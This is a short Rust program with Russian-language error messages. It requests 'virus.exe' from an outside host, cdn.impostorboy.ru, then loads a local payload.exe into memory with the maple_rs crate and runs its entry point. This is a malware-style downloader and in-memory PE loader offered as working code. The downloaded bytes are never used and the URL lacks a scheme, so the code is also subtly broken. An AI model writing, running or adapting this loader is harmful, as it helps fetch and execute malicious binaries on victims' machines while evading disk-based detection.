use anyhow::{Context, Result};
use maple_rs::Maple;
use std::fs;

fn main() -> Result<()> {
    let virus = reqwest::blocking::get("cdn.impostorboy.ru/virus.exe");
    let pe_bytes = fs::read("payload.exe").context("Не удалось прочитать файл payload.exe")?;

    let module = Maple::load_executable_from_memory(&pe_bytes)
        .context("Не удалось загрузить PE-файл из памяти")?;

    module
        .execute_entry_point()
        .context("Не удалось выполнить точку входа PE-файла")?;

    Ok(())
}
